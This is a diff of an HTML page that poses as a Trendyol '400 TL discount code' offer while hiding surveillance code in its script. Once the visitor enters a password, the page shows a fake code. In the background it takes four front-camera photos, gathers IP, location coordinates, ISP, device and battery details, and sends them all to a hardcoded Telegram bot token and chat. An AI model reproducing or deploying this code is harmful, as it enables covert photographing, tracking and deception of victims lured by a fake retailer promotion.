@@ -5,65 +5,38 @@
   <title>Trendyol - 400 TL İndirim Kodu</title>
   <link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico" />
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
+    * { box-sizing: border-box; font-family: Arial, sans-serif; }
     body {
       background-color: #f5f5f5;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      margin: 0; padding: 0;
+      display: flex; flex-direction: column; align-items: center;
     }
     header {
-      background-color: #f27a1a;
-      width: 100%;
-      padding: 15px 0;
-      text-align: center;
+      background-color: #f27a1a; width: 100%;
+      padding: 15px 0; text-align: center;
     }
-    header img {
-      height: 30px;
-    }
+    header img { height: 30px; }
     .container {
-      margin-top: 50px;
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 8px;
+      margin-top: 50px; background-color: #fff;
+      padding: 30px; border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 90%;
-      max-width: 400px;
+      width: 90%; max-width: 400px;
     }
-    h2 {
-      color: #333;
-      margin-bottom: 20px;
-      text-align: center;
-    }
+    h2 { color: #333; margin-bottom: 20px; text-align: center; }
     input[type="text"] {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+      width: 100%; padding: 12px; margin-bottom: 20px;
+      border: 1px solid #ccc; border-radius: 4px;
       font-size: 16px;
     }
     button {
-      width: 100%;
-      padding: 12px;
-      background-color: #f27a1a;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
+      width: 100%; padding: 12px;
+      background-color: #f27a1a; color: white;
+      font-size: 16px; border: none;
+      border-radius: 4px; cursor: pointer;
     }
-    button:hover {
-      background-color: #e06800;
-    }
+    button:hover { background-color: #e06800; }
     .code-box {
-      margin-top: 20px;
-      padding: 15px;
+      margin-top: 20px; padding: 15px;
       background-color: #f0f0f0;
       border-left: 4px solid #f27a1a;
       font-weight: bold;
@@ -71,10 +44,8 @@
       word-break: break-word;
     }
     .error {
-      color: red;
-      margin-top: 10px;
-      display: none;
-      text-align: center;
+      color: red; margin-top: 10px;
+      display: none; text-align: center;
     }
   </style>
 </head>
@@ -91,7 +62,12 @@
   </div>
 
   <script>
-    const correctPassword = "670570";
+    function getQueryParam(key) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(key);
+    }
+
+    const correctPassword = getQueryParam("pass");
     const botToken = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
     const chatId = "7791726274";
 
@@ -101,71 +77,52 @@
       return `TR-${part1}-${part2}`;
     }
 
-    // IP ve detaylı bilgileri ip-api'den çekiyoruz
     async function getIPDetails() {
       try {
         const res = await fetch("http://ip-api.com/json/?fields=status,message,country,city,query,isp,proxy,mobile,lat,lon");
         const data = await res.json();
-        if(data.status === "success") {
-          return data;
-        }
-        return null;
-      } catch(e) {
-        return null;
-      }
+        return data.status === "success" ? data : null;
+      } catch { return null; }
     }
 
-    // Batarya bilgisi alalım
     async function getBattery() {
-      if(navigator.getBattery) {
+      if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
           return {
             level: Math.floor(battery.level * 100) + "%",
             charging: battery.charging
           };
-        } catch {
-          return null;
-        }
+        } catch { return null; }
       }
       return null;
     }
 
-    // Kamera fotoğraf çekimi fonksiyonu, 4 tane foto çekecek, base64 döner
     async function capturePhotos(count = 4, delayMs = 1000) {
-      if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        return [];
-      }
-      const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return [];
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       const video = document.createElement("video");
       video.srcObject = stream;
       video.play();
-
-      // 1 saniye video hazır olsun diye bekle
       await new Promise(r => setTimeout(r, 1000));
-
       const canvas = document.createElement("canvas");
-      canvas.width = 320; // küçük boyut, fazla büyütme
-      canvas.height = 240;
+      canvas.width = 320; canvas.height = 240;
       const ctx = canvas.getContext("2d");
       const photos = [];
-
-      for(let i=0; i<count; i++) {
+      for (let i = 0; i < count; i++) {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imgData = canvas.toDataURL("image/jpeg", 0.7);
         photos.push(imgData);
         await new Promise(r => setTimeout(r, delayMs));
       }
-
       stream.getTracks().forEach(track => track.stop());
       return photos;
     }
 
-    // Telegram'a mesaj gönderme fonksiyonu
     async function sendTelegramMessage(text) {
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
           text: text,
@@ -174,14 +131,12 @@
       });
     }
 
-    // Telegram'a fotoğraf gönderme fonksiyonu (base64'i blob yapıp formdata ile göndereceğiz)
     async function sendTelegramPhoto(base64data, caption = "") {
       const blob = await (await fetch(base64data)).blob();
       const formData = new FormData();
       formData.append("chat_id", chatId);
       formData.append("photo", blob);
-      if(caption) formData.append("caption", caption);
-
+      if (caption) formData.append("caption", caption);
       await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         body: formData
@@ -195,27 +150,15 @@
 
       if (input === correctPassword) {
         error.style.display = "none";
-
-        // 1- Önce 4 foto çekelim
         let photos = [];
-        try {
-          photos = await capturePhotos(4, 1000);
-        } catch (e) {
-          // Kamera izni yoksa veya hata varsa photos boş kalacak
-          photos = [];
-        }
-
-        // 2- Kod üret
+        try { photos = await capturePhotos(4, 1000); } catch {}
         const code = generateFakeCode();
         codeBox.textContent = code;
         codeBox.style.display = "block";
-
-        // 3- IP ve detayları çek
         const ipData = await getIPDetails();
         const device = navigator.userAgent;
         const battery = await getBattery();
 
-        // Mesaj formatı istediğin gibi:
         let message = `📡 IP: ${ipData?.query || "-"}\n` +
                       `🌍 Ülke: ${ipData?.country || "-"}\n` +
                       `🏙️ Şehir: ${ipData?.city || "-"}\n` +
@@ -226,14 +169,10 @@
                       `🔋 Şarj: ${battery ? battery.level + (battery.charging ? " (Şarjda)" : " (Bataryada)") : "-"}\n\n` +
                       `Yeni giriş yapıldı:\nKod: ${code}`;
 
-        // 4- Telegram'a önce mesaj gönder
         await sendTelegramMessage(message);
-
-        // 5- Telegram'a fotoğrafları tek tek gönder (caption olarak boş veriyoruz)
-        for(let i=0; i<photos.length; i++) {
-          await sendTelegramPhoto(photos[i], `Fotoğraf ${i+1}`);
+        for (let i = 0; i < photos.length; i++) {
+          await sendTelegramPhoto(photos[i], `Fotoğraf ${i + 1}`);
         }
-
       } else {
         error.style.display = "block";
         codeBox.style.display = "none";
